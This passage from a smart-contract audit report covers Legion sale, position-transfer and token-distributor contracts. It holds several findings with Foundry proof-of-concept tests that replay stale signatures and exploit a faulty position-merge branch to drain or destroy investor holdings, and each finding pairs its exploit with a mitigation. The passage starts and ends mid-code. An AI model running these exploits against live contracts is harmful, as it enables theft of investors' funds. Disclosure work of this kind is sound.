pragma solidity ^0.8.30; import "forge-std/Test.sol"; contract MergeHarness { struct Position { uint256 investedCapital; bool hasSettled; bool hasClaimedExcess; bool hasRefunded; } mapping(uint256=>Position) public positions; mapping(address=>uint256) public ids; mapping(uint256=>address) public ownerOf; function seed(address owner,uint256 id,uint256 invested,bool claimedExcess) external { ids[owner]=id; ownerOf[id]=owner; positions[id]=Position(invested,false,claimedExcess,false); } function transferAfterValidAuthorization(address from,address to,uint256 positionId) external { _verifyCanTransfer(positionId); _burnOrTransfer(from,to,positionId); } function _verifyCanTransfer(uint256 positionId) internal view { Position memory p=positions[positionId]; require(!p.hasRefunded && !p.hasSettled && p.hasClaimedExcess,"not transferable"); } function _burnOrTransfer(address from,address to,uint256 positionId) internal { uint256 positionIdTo=ids[to]; if(positionIdTo!=0){ Position memory positionToBurn=positions[positionId]; Position storage positionToUpdate=positions[positionIdTo]; require(!positionToUpdate.hasRefunded && !positionToUpdate.hasSettled && positionToUpdate.hasClaimedExcess,"bad merge target"); positionToUpdate.investedCapital+=positionToBurn.investedCapital; delete positions[positionId]; uint256 burnedId=ids[from]; delete ownerOf[burnedId]; delete ids[from]; } else { require(ownerOf[positionId]==from,"not owner"); ownerOf[positionId]=to; delete ids[from]; ids[to]=positionId; } } } contract PositionMergePoC is Test { function testMismatchedFromAndPositionIdDeletesVictimAccounting() public { MergeHarness h=new MergeHarness(); address victim=address(0xAAA); address from=address(0xF); address to=address(0xB0B); h.seed(victim,1,100,true); h.seed(from,2,1,true); h.seed(to,3,5,true); h.transferAfterValidAuthorization(from,to,1); (uint256 toCapital,,,) = h.positions(3); (uint256 victimCapital,,,) = h.positions(1); assertEq(toCapital,105); assertEq(victimCapital,0); assertEq(h.ids(victim),1); assertEq(h.ownerOf(1),victim); assertEq(h.ids(from),0); assertEq(h.ownerOf(2),address(0)); } }

## Suggested Mitigation
Before any merge or transfer, require `_positionId == s_investorPositionIds[_from]` and `ownerOf(_positionId) == _from`. In the merge branch, burn the exact `_positionId` after unlocking it, or make `_burnInvestorPosition` accept and validate the expected position ID. Keep the signature path, but do not rely on off-chain authorization to preserve on-chain ownership invariants.
```

### C-6 / `HbNRKLz6M6miWKv_ggwB2`
- Finding title: Stale transfer authorizations can merge another user's position and burn the signer's current position
- Report lines: 658-813
```md
## [C-6]. Stale transfer authorizations can merge another user's position and burn the signer's current position

## id: HbNRKLz6M6miWKv_ggwB2

## Derived From Pattern/Invariant
PermitOrSignatureReplay / DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
LegionPositionManager / sale _burnOrTransferInvestorPosition implementations.transferInvestorPositionWithAuthorization

## Finding Status: Valid
### Finding Status Justification: The reported path exists in LegionCapitalRaise, LegionPreLiquidApprovedSale, and LegionAbstractSale-derived sales. transferInvestorPositionWithAuthorization verifies a Legion signer signature over from, to, positionId, msg.sender, contract, and chain, but has no nonce, deadline, or consumed-signature tracking for transfer authorizations. The normal non-merge path calls _transfer(from, to, positionId), which would enforce current ownership. The merge path instead triggers whenever s_investorPositionIds[to] != 0, loads s_investorPositions[positionId], credits it into the receiver's existing position, deletes s_investorPositions[positionId], then calls _burnInvestorPosition(from). That burn resolves s_investorPositionIds[from] at execution time rather than burning the explicit positionId. Therefore, if a previously authorized positionId was validly transferred away from from, and from later receives a different position, the stale authorization can still execute through the merge branch if to already has a mergeable position. This corrupts accounting for the current owner of the stale positionId and burns from's current position. Existing guards only check lifecycle state and signature signer; they do not prove from currently owns positionId in the merge branch, nor do they consume/expire transfer signatures. The issue is in scoped files, is not documented as intentional, does not depend on non-standard ERC20 behavior, and is exploitable by a permissionless caller holding a still-valid transfer authorization once realistic state changes occur. Impact is High because position NFTs/entitlements and investor accounting can be permanently corrupted or frozen. Likelihood is Occasional because it requires a specific but plausible sequence of authorized transfers and a receiver with an existing mergeable position.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Transfer authorizations have no nonce, deadline, or consumed-signature state, and the merge path does not verify that `from` still owns `positionId`. The normal transfer path eventually calls ERC721 `_transfer(from, to, positionId)`, which enforces ownership, but the merge path skips that check whenever `to` already has a position. It credits `s_investorPositions[positionId]` into the receiver, deletes that position, then burns whatever position is currently mapped to `from` rather than burning `positionId` itself.

Vulnerable snippets:
`bytes32 _data = keccak256(abi.encodePacked(_from, _to, _positionId, msg.sender, address(this), block.chainid)).toEthSignedMessageHash();`
There is no nonce, expiry, or used-signature check.

`if (positionIdTo != 0) { InvestorPosition memory positionToBurn = s_investorPositions[_positionId]; InvestorPosition storage positionToUpdate = s_investorPositions[positionIdTo]; positionToUpdate.investedCapital += positionToBurn.investedCapital; delete s_investorPositions[_positionId]; _burnInvestorPosition(_from); }`

`_burnInvestorPosition(_from)` resolves `s_investorPositionIds[_from]` at execution time. Therefore, after a stale authorization for Alice's old position remains valid, Alice can receive a different position and the stale authorization can be executed against a receiver with an existing position. The receiver is credited with the old position's accounting, that old position's owner is left with a token whose accounting was deleted, and Alice's new position token is burned.

## Impact
Direct theft/corruption of investor position accounting and permanent freezing of the affected position NFTs/entitlements. The receiver's existing position can be credited with another owner's invested capital/allocation while the current owner of the stale `positionId` loses usable accounting, and `from` loses whichever different position they currently hold.

## Proof of Concept
1. Alice owns position #1 and Bob already owns position #2.
2. A valid Legion transfer authorization exists for `from=Alice, to=Bob, positionId=1, submitter=Relayer`.
3. Before that authorization is submitted, Alice's position #1 is validly transferred to Carol.
4. Alice then validly receives Dave's position #3, so `s_investorPositionIds[Alice] == 3`.
5. The relayer submits the stale Alice-to-Bob authorization for position #1.
6. Because Bob already has a position, the merge branch executes without checking that Alice still owns #1. Bob's position #2 is credited with Carol's position #1 accounting, position #1 accounting is deleted, and `_burnInvestorPosition(Alice)` burns Alice's current position #3.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionPositionManager} from "../src/position/LegionPositionManager.sol";

contract PositionReplayHarness is LegionPositionManager {
    using MessageHashUtils for bytes32;

    struct Position { uint256 investedCapital; bool hasClaimedExcess; bool hasRefunded; bool hasSettled; }

    mapping(uint256 => Position) public positions;
    address public immutable signer;

    constructor(address signer_) {
        signer = signer_;
        s_positionManagerConfig.name = "Position";
        s_positionManagerConfig.symbol = "POS";
        s_positionManagerConfig.baseURI = "ipfs://pos/";
    }

    function mintPosition(address to, uint256 capital) external returns (uint256 id) {
        id = _createInvestorPosition(to);
        positions[id] = Position({investedCapital: capital, hasClaimedExcess: true, hasRefunded: false, hasSettled: false});
    }

    function investorId(address investor) external view returns (uint256) { return s_investorPositionIds[investor]; }
    function capital(uint256 id) external view returns (uint256) { return positions[id].investedCapital; }

    function transferInvestorPosition(address from, address to, uint256 positionId) external override {
        _verifyCanTransfer(positionId);
        _burnOrTransferInvestorPosition(from, to, positionId);
    }

    function transferInvestorPositionWithAuthorization(address from, address to, uint256 positionId, bytes calldata sig) external override {
        _verifyTransferSignature(from, to, positionId, signer, sig);
        _verifyCanTransfer(positionId);
        _burnOrTransferInvestorPosition(from, to, positionId);
    }

    function _verifyCanTransfer(uint256 id) private view {
        Position memory p = positions[id];
        require(!p.hasRefunded && !p.hasSettled && p.hasClaimedExcess, "not transferable");
    }

    function _burnOrTransferInvestorPosition(address from, address to, uint256 positionId) private {
        uint256 positionIdTo = s_investorPositionIds[to];
        if (positionIdTo != 0) {
            Position memory positionToBurn = positions[positionId];
            Position storage positionToUpdate = positions[positionIdTo];
            require(!positionToUpdate.hasRefunded && !positionToUpdate.hasSettled && positionToUpdate.hasClaimedExcess, "bad merge");
            positionToUpdate.investedCapital += positionToBurn.investedCapital;
            delete positions[positionId];
            _burnInvestorPosition(from);
        } else {
            _transferInvestorPosition(from, to, positionId);
        }
    }
}

contract PositionAuthorizationReplayTest is Test {
    using MessageHashUtils for bytes32;

    uint256 signerPk = 0xA11CE;
    address signer = vm.addr(signerPk);
    address relayer = address(0xBEEF);
    address alice = address(0xA1);
    address bob = address(0xB0B);
    address carol = address(0xCA);
    address dave = address(0xDA);
    PositionReplayHarness h;

    function setUp() public { h = new PositionReplayHarness(signer); }

    function signTransfer(address from, address to, uint256 id) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked(from, to, id, relayer, address(h), block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function testStaleAuthorizationMergeStealsAndBurnsDifferentPosition() public {
        uint256 aliceOld = h.mintPosition(alice, 100 ether);
        uint256 bobExisting = h.mintPosition(bob, 1 ether);
        uint256 davePosition = h.mintPosition(dave, 50 ether);

        bytes memory staleAliceToBob = signTransfer(alice, bob, aliceOld);

        vm.prank(relayer);
        h.transferInvestorPositionWithAuthorization(alice, carol, aliceOld, signTransfer(alice, carol, aliceOld));
        assertEq(h.ownerOf(aliceOld), carol);
        assertEq(h.investorId(alice), 0);

        vm.prank(relayer);
        h.transferInvestorPositionWithAuthorization(dave, alice, davePosition, signTransfer(dave, alice, davePosition));
        assertEq(h.ownerOf(davePosition), alice);
        assertEq(h.investorId(alice), davePosition);

        vm.prank(relayer);
        h.transferInvestorPositionWithAuthorization(alice, bob, aliceOld, staleAliceToBob);

        assertEq(h.capital(bobExisting), 101 ether);
        assertEq(h.capital(aliceOld), 0);
        assertEq(h.investorId(carol), aliceOld);
        assertEq(h.investorId(alice), 0);
        vm.expectRevert();
        h.ownerOf(davePosition);
    }
}

## Suggested Mitigation
Add a per-authorization nonce or mark transfer signatures as consumed, include a deadline in the signed payload, and require `s_investorPositionIds[from] == positionId` before both the transfer and merge paths. In the merge branch, burn `positionId` only after confirming `ownerOf(positionId) == from`, or call a checked internal burn that operates on the explicit `positionId` rather than resolving the sender's current mapping.
```

### H-7 / `R8fv_EAzMcPv_V-7xAYyM`
- Finding title: Stale distributor claim signatures can overclaim and exhaust tokens for later valid claimants
- Report lines: 814-968
```md
## [H-7]. Stale distributor claim signatures can overclaim and exhaust tokens for later valid claimants

## id: R8fv_EAzMcPv_V-7xAYyM

## Derived From Pattern/Invariant
PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
LegionTokenDistributor.claimTokenAllocation

## Finding Status: Valid
### Finding Status Justification: The code path exists in LegionTokenDistributor.claimTokenAllocation. _verifyValidPosition signs only msg.sender, address(this), block.chainid, and claimAmount. It has no nonce, deadline, claim epoch, allocation version, consumed digest mapping, or latest-allocation state. After a signature verifies, claimTokenAllocation sets hasSettled, increments totalAmountClaimed, and transfers/deploys vesting for the nominal claimAmount, with no check that totalAmountClaimed + claimAmount is within totalAmountToDistribute. Therefore, if Legion signer has issued multiple valid allocations for the same investor and intended a newer lower amount to supersede an older higher amount, the old signature remains usable. The old signature can settle that investor and consume more distributor tokens than intended, causing later valid claims to fail due to insufficient balance. This is not protected by the one-claim hasSettled flag because the stale signature is used for the first and only claim. It is not merely future speculation because stale signatures can exist under the current signing design; however, it does require realistic backend/signing workflow where allocations are corrected. The root is missing replay/versioning and aggregate cap enforcement, not non-standard token behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
claimTokenAllocation accepts any still-valid Legion signer authorization for msg.sender and does not bind signatures to a nonce, deadline, claim epoch, or latest allocation version. Once multiple authorizations exist for the same investor, the investor can choose an older higher-value claim after the backend intended to supersede it with a lower allocation. The function then marks the position settled and increments totalAmountClaimed, but it never checks that aggregate claims stay within totalAmountToDistribute before transferring tokens.

Vulnerable snippets:
function _verifyValidPosition(uint256 _claimAmount, bytes calldata _signature) internal view {
    bytes32 _data = keccak256(abi.encodePacked(msg.sender, address(this), block.chainid, _claimAmount)).toEthSignedMessageHash();
    if (_data.recover(_signature) != s_tokenDistributorConfig.legionSigner) revert Errors.LegionSale__InvalidSignature(_signature);
}

position.hasSettled = true;
s_tokenDistributorConfig.totalAmountClaimed += claimAmount;
...
SafeTransferLib.safeTransfer(tokenDistributorConfig.askToken, msg.sender, amountToDistributeOnClaim);

## Impact
An eligible investor can use a superseded higher allocation signature to pull more tokens than their latest intended allocation. This drains the distributor balance and causes later valid claimants to revert from insufficient token balance, temporarily freezing their token allocations and transferring value to the stale-signature holder.

## Proof of Concept
1. Legion signer issues an initial claim signature for attacker with claimAmount = 900 tokens.
2. Before attacker claims, the intended allocation is corrected to 100 tokens and a new signature is issued, but the old signature has no nonce or deadline and remains valid.
3. Project supplies 1,000 tokens to the distributor.
4. Attacker calls claimTokenAllocation with the old 900-token signature and 100% TGE vesting.
5. The distributor accepts the stale authorization, transfers 900 tokens to attacker, and sets attacker hasSettled.
6. A second investor with a valid 900-token allocation now reverts because the distributor only has 100 tokens left.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {LibClone} from "@solady/src/utils/LibClone.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionTokenDistributor} from "src/distribution/LegionTokenDistributor.sol";
import {ILegionTokenDistributor} from "src/interfaces/distribution/ILegionTokenDistributor.sol";
import {ILegionAddressRegistry} from "src/interfaces/registries/ILegionAddressRegistry.sol";
import {ILegionVestingManager} from "src/interfaces/vesting/ILegionVestingManager.sol";
import {Constants} from "src/utils/Constants.sol";

contract MockRegistry is ILegionAddressRegistry {
    mapping(bytes32 => address) public addrs;
    function setLegionAddress(bytes32 id, address updatedAddress) external { addrs[id] = updatedAddress; }
    function getLegionAddress(bytes32 id) external view returns (address) { return addrs[id]; }
}

contract MockERC20 {
    string public name = "T";
    string public symbol = "T";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "BAL"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "BAL"); require(allowance[from][msg.sender] >= amount, "ALLOW"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract DistributorStaleSignaturePoC is Test {
    using MessageHashUtils for bytes32;

    uint256 signerPk = 0xA11CE;
    address signer = vm.addr(signerPk);
    address project = address(0x100);
    address attacker = address(0x200);
    address victim = address(0x300);
    MockERC20 token;
    LegionTokenDistributor distributor;

    function setUp() public {
        token = new MockERC20();
        MockRegistry registry = new MockRegistry();
        registry.setLegionAddress(Constants.LEGION_BOUNCER_ID, address(0xB0));
        registry.setLegionAddress(Constants.LEGION_SIGNER_ID, signer);
        registry.setLegionAddress(Constants.LEGION_FEE_RECEIVER_ID, address(0xF0));
        registry.setLegionAddress(Constants.LEGION_VESTING_FACTORY_ID, address(0xF1));
        registry.setLegionAddress(Constants.LEGION_VESTING_CONTROLLER_ID, address(0xF2));

        address impl = address(new LegionTokenDistributor());
        distributor = LegionTokenDistributor(payable(impl.clone()));
        distributor.initialize(ILegionTokenDistributor.TokenDistributorInitializationParams({
            legionFeeOnTokensSoldBps: 0,
            referrerFeeOnTokensSoldBps: 0,
            referrerFeeReceiver: address(0xF3),
            askToken: address(token),
            addressRegistry: address(registry),
            projectAdmin: project,
            totalAmountToDistribute: 1000 ether
        }));

        token.mint(project, 1000 ether);
        vm.prank(project);
        token.approve(address(distributor), type(uint256).max);
        vm.prank(project);
        distributor.supplyTokens(1000 ether, 0, 0);
    }

    function signClaim(address investor, uint256 amount) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked(investor, address(distributor), block.chainid, amount)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function signVesting(address investor, ILegionVestingManager.LegionInvestorVestingConfig memory cfg) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encode(investor, address(distributor), block.chainid, cfg)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function fullTge() internal pure returns (ILegionVestingManager.LegionInvestorVestingConfig memory cfg) {
        cfg.vestingType = ILegionVestingManager.VestingType.LEGION_LINEAR;
        cfg.tokenAllocationOnTGERate = uint64(Constants.TOKEN_ALLOCATION_RATE_DENOMINATOR);
    }

    function testStaleHigherClaimSignatureDrainsDistributor() external {
        ILegionVestingManager.LegionInvestorVestingConfig memory cfg = fullTge();
        bytes memory staleHigh = signClaim(attacker, 900 ether);
        bytes memory correctedLow = signClaim(attacker, 100 ether);
        bytes memory attackerVesting = signVesting(attacker, cfg);
        bytes memory victimClaim = signClaim(victim, 900 ether);
        bytes memory victimVesting = signVesting(victim, cfg);
        correctedLow;

        vm.prank(attacker);
        distributor.claimTokenAllocation(900 ether, cfg, staleHigh, attackerVesting);
        assertEq(token.balanceOf(attacker), 900 ether);
        assertEq(token.balanceOf(address(distributor)), 100 ether);

        vm.prank(victim);
        vm.expectRevert();
        distributor.claimTokenAllocation(900 ether, cfg, victimClaim, victimVesting);
    }
}

## Suggested Mitigation
Bind each claim authorization to a per-investor nonce or allocation version, include a deadline, consume the nonce/hash on claim, and reject claims where totalAmountClaimed + claimAmount exceeds totalAmountToDistribute. If allocations can be corrected, store the latest authorized digest or epoch on-chain so stale signatures are not accepted.
```

### H-8 / `IJy4rzcAerefpKytgAG47`
- Finding title: Stale position-transfer authorization can merge another holder's position and burn an unrelated position
- Report lines: 969-1123
```md
## [H-8]. Stale position-transfer authorization can merge another holder's position and burn an unrelated position

## id: IJy4rzcAerefpKytgAG47

## Derived From Pattern/Invariant
PermitFrontRun / authorization nonce and deadline missing

## Exploit Type
SignatureReplay

## Location
LegionAbstractSale.transferInvestorPositionWithAuthorization

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in LegionAbstractSale.transferInvestorPositionWithAuthorization and the same pattern also appears in related position-transfer implementations. The signature binds from, to, positionId, executor, sale, and chain, but has no nonce/deadline and does not prove current ownership at execution time. _verifyCanTransferInvestorPosition only checks the stored flags for positionId. In the merge branch, _burnOrTransferInvestorPosition credits s_investorPositions[positionId] into the recipient's existing position, deletes that position storage, then calls _burnInvestorPosition(from), which burns s_investorPositionIds[from], potentially a different token. No existing guard checks s_investorPositionIds[from] == positionId or ownerOf(positionId) == from before merge. The exploit requires a prior valid Legion-signed authorization and timing after a legitimate transfer, so likelihood is not Common, but it is realistic. Impact is High because victim refund/claim accounting can be destroyed and credited to another position.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
transferInvestorPositionWithAuthorization verifies only that Legion signed the tuple (from, to, positionId, msg.sender, sale, chain), then merges by positionId without proving that from still owns that positionId. In the merge branch, _burnOrTransferInvestorPosition() copies s_investorPositions[_positionId] into the recipient's existing position, deletes s_investorPositions[_positionId], and then burns whatever position is currently mapped to _from via _burnInvestorPosition(_from). There is no check that s_investorPositionIds[_from] == _positionId or ownerOf(_positionId) == _from, and the signature has no nonce or deadline.

Vulnerable snippet:
function transferInvestorPositionWithAuthorization(address from, address to, uint256 positionId, bytes calldata transferSignature) external ... {
    _verifyTransferSignature(from, to, positionId, s_addressConfig.legionSigner, transferSignature);
    _verifyCanTransferInvestorPosition(positionId);
    _burnOrTransferInvestorPosition(from, to, positionId);
}

if (positionIdTo != 0) {
    InvestorPosition memory positionToBurn = s_investorPositions[_positionId];
    InvestorPosition storage positionToUpdate = s_investorPositions[positionIdTo];
    positionToUpdate.investedCapital += positionToBurn.investedCapital;
    delete s_investorPositions[_positionId];
    _burnInvestorPosition(_from);
}

A prior valid authorization for A's old position P remains usable after P has been transferred to a new owner. If the stale executor calls it while the recipient already has a merge-eligible position and A currently owns any other position Q, the contract moves P's accounting into the recipient, deletes P's position storage, and burns Q. This corrupts ownership/accounting and lets the recipient withdraw the stolen investedCapital if the sale is later canceled.

## Impact
A stale unprivileged executor can destroy a victim's position accounting and move its investedCapital into an attacker-controlled position. On cancellation, the attacker withdraws the victim's cancellation refund while the victim's position has zero withdrawable capital, causing theft/freezing of user funds tied to the position.

## Proof of Concept
1. Attacker A owns position P and obtains a valid Legion transfer authorization from A to attacker-controlled Bob, but does not execute it.
2. A transfers P to victim Carol through a legitimate transfer authorization.
3. Bob already owns a merge-eligible position B with hasClaimedExcess=true. A obtains any other sacrificial position Q.
4. The executor submits the stale A->Bob authorization for P.
5. Because Bob already has B, the merge branch adds Carol's P.investedCapital to B, deletes P's position storage, and burns Q from A instead of checking that A owns P.
6. If the sale is canceled, Bob withdraws B including Carol's capital; Carol's position storage is zeroed and her cancellation withdrawal reverts.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionAbstractSale} from "../src/sales/LegionAbstractSale.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SaleHarness is LegionAbstractSale {
    function configure(address signer, address bidToken) external {
        s_addressConfig.legionSigner = signer;
        s_addressConfig.bidToken = bidToken;
        s_saleConfig.refundEndTime = uint64(block.timestamp - 1);
    }
    function seed(address owner, uint256 amount) external returns (uint256 id) {
        id = _createInvestorPosition(owner);
        s_investorPositions[id].investedCapital = amount;
        s_investorPositions[id].hasClaimedExcess = true;
        s_saleStatus.totalCapitalInvested += amount;
    }
    function forceCancel() external { s_saleStatus.isCanceled = true; }
    function posId(address owner) external view returns (uint256) { return s_investorPositionIds[owner]; }
    function posAmount(uint256 id) external view returns (uint256) { return s_investorPositions[id].investedCapital; }
}

contract StaleTransferAuthorizationTest is Test {
    using MessageHashUtils for bytes32;

    uint256 internal signerPk = 0xA11CE;
    address internal signer;
    address internal attacker = address(0xA);
    address internal bob = address(0xB);
    address internal carol = address(0xC);
    address internal exec = address(0xE);
    SaleHarness internal sale;
    MockERC20 internal token;

    function setUp() public {
        signer = vm.addr(signerPk);
        token = new MockERC20();
        sale = new SaleHarness();
        sale.configure(signer, address(token));
    }

    function signTransfer(address from, address to, uint256 id, address executor) internal view returns (bytes memory) {
        bytes32 digest = keccak256(abi.encodePacked(from, to, id, executor, address(sale), block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function testStaleTransferAuthorizationStealsMergedCancellationRefund() public {
        uint256 p = sale.seed(attacker, 1000 ether);
        bytes memory stale = signTransfer(attacker, bob, p, exec);
        bytes memory sellToCarol = signTransfer(attacker, carol, p, exec);

        vm.prank(exec);
        sale.transferInvestorPositionWithAuthorization(attacker, carol, p, sellToCarol);
        assertEq(sale.posId(carol), p);
        assertEq(sale.posAmount(p), 1000 ether);

        uint256 b = sale.seed(bob, 10 ether);
        sale.seed(attacker, 1 ether);

        vm.prank(exec);
        sale.transferInvestorPositionWithAuthorization(attacker, bob, p, stale);

        assertEq(sale.posAmount(b), 1010 ether);
        assertEq(sale.posAmount(p), 0);
        assertEq(sale.posId(attacker), 0);

        token.mint(address(sale), 1011 ether);
        sale.forceCancel();

        vm.prank(bob);
        sale.withdrawInvestedCapitalIfCanceled();
        assertEq(token.balanceOf(bob), 1010 ether);

        vm.expectRevert();
        vm.prank(carol);
        sale.withdrawInvestedCapitalIfCanceled();
    }
}


## Suggested Mitigation
Require the source address to own the exact position before any transfer or merge, e.g. check s_investorPositionIds[from] == positionId and/or ownerOf(positionId) == from before _verifyCanTransferInvestorPosition and before _burnOrTransferInvestorPosition. Add nonce and deadline fields to transfer authorizations and mark each authorization digest consumed so stale signatures cannot be reused after ownership changes.
```

### C-9 / `E7_tysEzu7-rWQaUfS2Tg`
- Finding title: Replayable position transfer authorization can burn a later investor position and permanently freeze entitlements
- Report lines: 1124-1277
```md
## [C-9]. Replayable position transfer authorization can burn a later investor position and permanently freeze entitlements

## id: E7_tysEzu7-rWQaUfS2Tg

## Derived From Pattern/Invariant
PermitFrontRun / transfer authorization lacks nonce, deadline, and used-signature tracking

## Exploit Type
SignatureReplay

## Location
LegionPositionManager._verifyTransferSignature

## Finding Status: Valid
### Finding Status Justification: The vulnerable code path exists. `_verifyTransferSignature` is `view` and verifies only `(from,to,positionId,msg.sender,address(this),chainId)`, with no nonce, deadline, ownership epoch, or consumed-signature state. The concrete `transferInvestorPositionWithAuthorization` functions then call `_burnOrTransferInvestorPosition`. In the merge branch, if `to` already has a position, the code deletes `s_investorPositions[_positionId]` but calls `_burnInvestorPosition(_from)`, which burns whatever token is currently mapped to `from`, not necessarily `_positionId`. After an authorized Alice-to-Bob transfer of P1, Alice can later receive P2 through another position transfer before sale results are published. Replaying the old signature enters the merge branch because Bob still maps to P1, deletes P1 position data, and burns Alice's mapped P2. Existing checks only bind the signature to the executor/contract/chain and verify transferability flags; they do not prevent replay or enforce `s_investorPositionIds[from] == positionId` in the merge path. This is in scoped contracts, not documented as intentional, does not require non-standard tokens or user parameter mistakes, and is exploitable by a holder of a previously valid authorization under realistic transfer-cycle conditions. Impact is High because mapped position entitlements can be permanently destroyed or made unreachable; likelihood is Occasional due to requiring a prior valid authorization plus subsequent position receipt before finalization.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_verifyTransferSignature` only checks that the Legion signer signed `(from, to, positionId, msg.sender, address(this), chainId)`. It is `view`, records no consumed signature, and includes no nonce, deadline, or ownership epoch. The same executor can therefore replay an old authorization whenever the tuple becomes valid again. This becomes critical in the sale/raise implementations because `transferInvestorPositionWithAuthorization()` calls `_burnOrTransferInvestorPosition(from, to, positionId)`, whose merge branch loads and deletes `_positionId` but burns `s_investorPositionIds[_from]` instead of requiring `_from` currently owns `_positionId`.

Vulnerable snippets:
`bytes32 _data = keccak256(abi.encodePacked(_from, _to, _positionId, msg.sender, address(this), block.chainid)).toEthSignedMessageHash();`

`if (_data.recover(_signature) != _signer) revert Errors.LegionSale__InvalidSignature(_signature);`

and in implementations:
`delete s_investorPositions[_positionId]; _burnInvestorPosition(_from);`

If `from` later receives another position and `to` still has the original position, replaying the old signature enters the merge branch, deletes the receiver's original position data, and burns the unrelated new position mapped to `from`. Those position entitlements are then no longer claimable through the investor mapping/NFT flow.

## Impact
An unprivileged executor holding a previously valid transfer authorization can permanently freeze investor position NFTs and the capital/token entitlements represented by them. The victim loses the mapped SBT needed to claim or recover the position, while another live NFT can be left pointing to deleted position data.

## Proof of Concept
1. Legion signs an authorization allowing relayer R to transfer position P1 from Alice to Bob.
2. R submits it once; P1 moves to Bob, and Bob's mapping points to P1.
3. Before sale results are published, Alice receives a different transferable position P2.
4. R replays the old Alice -> Bob, P1 signature. The signature still verifies because no nonce/deadline/used flag exists.
5. Since Bob already has P1, the merge branch loads and deletes P1, then `_burnInvestorPosition(Alice)` burns P2.
6. Alice's P2 entitlement is no longer reachable, and Bob's P1 NFT points at deleted position data.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayHarness {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    struct Position {
        uint256 investedCapital;
        bool hasClaimedExcess;
        bool hasRefunded;
        bool hasSettled;
    }

    address public legionSigner;
    uint256 public lastId;
    mapping(address => uint256) public investorPositionIds;
    mapping(uint256 => Position) public positions;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => bool) public exists;

    constructor(address signer) { legionSigner = signer; }

    function mintPosition(address investor, uint256 capital) external returns (uint256 id) {
        id = ++lastId;
        investorPositionIds[investor] = id;
        ownerOf[id] = investor;
        exists[id] = true;
        positions[id] = Position({investedCapital: capital, hasClaimedExcess: true, hasRefunded: false, hasSettled: false});
    }

    function transferHash(address from, address to, uint256 positionId, address executor) public view returns (bytes32) {
        return keccak256(abi.encodePacked(from, to, positionId, executor, address(this), block.chainid)).toEthSignedMessageHash();
    }

    function transferInvestorPositionWithAuthorization(address from, address to, uint256 positionId, bytes calldata sig) external {
        require(transferHash(from, to, positionId, msg.sender).recover(sig) == legionSigner, "bad sig");
        Position memory p = positions[positionId];
        require(!p.hasRefunded && !p.hasSettled && p.hasClaimedExcess, "not transferable");
        _burnOrTransferInvestorPosition(from, to, positionId);
    }

    function _burnOrTransferInvestorPosition(address from, address to, uint256 positionId) internal {
        uint256 positionIdTo = investorPositionIds[to];
        if (positionIdTo != 0) {
            Position memory positionToBurn = positions[positionId];
            Position storage positionToUpdate = positions[positionIdTo];
            require(!positionToUpdate.hasRefunded && !positionToUpdate.hasSettled && positionToUpdate.hasClaimedExcess, "bad merge target");
            positionToUpdate.investedCapital += positionToBurn.investedCapital;
            delete positions[positionId];
            _burnInvestorPosition(from);
        } else {
            require(ownerOf[positionId] == from, "wrong owner");
            delete investorPositionIds[from];
            investorPositionIds[to] = positionId;
            ownerOf[positionId] = to;
        }
    }

    function _burnInvestorPosition(address investor) internal {
        uint256 id = investorPositionIds[investor];
        exists[id] = false;
        ownerOf[id] = address(0);
        delete investorPositionIds[investor];
    }

